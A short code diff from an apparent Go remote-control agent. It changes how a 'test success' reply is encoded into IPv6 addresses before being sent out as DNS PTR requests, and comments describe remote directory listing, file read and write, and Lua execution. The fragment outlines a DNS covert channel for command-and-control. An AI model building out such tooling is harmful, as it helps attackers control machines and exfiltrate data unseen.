@@ -120,7 +120,7 @@ func main() {
 				// List arbitrary dir, read file, write file, execute Lua
 				// Returns the result of execution (stdout or bool) or returns an error
 				if dnsConf == true {
-					encRes := []string{shared.Ipv6ToPTR("test success")}
+					encRes := shared.StringToIPv6List("test success")
 					err := shared.SendPTRRequest(CompUUID, encRes)
 					if err != true {
 						return
